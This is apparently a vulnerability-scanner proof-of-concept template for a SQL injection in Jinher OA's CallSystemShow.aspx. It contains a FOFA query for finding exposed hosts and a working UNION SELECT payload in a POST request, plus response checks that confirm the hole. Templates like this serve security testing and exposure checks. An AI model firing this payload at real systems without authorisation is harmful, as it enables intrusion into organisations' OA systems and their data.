id: poc-yaml-jinher-callsystemshow-aspx-sqli
info:
  name: 金和OA CallSystemShow.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /c6/JHBase.Web.Menu/CallSystemShow.aspx/
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: MessageID=%27+UNION+ALL+SELECT+NULL%2CNULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2CNULL--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"系统消息") &&

    contains(body,"0x" + t2) &&

    contains(body,"JHSoft")

    '
transport: http
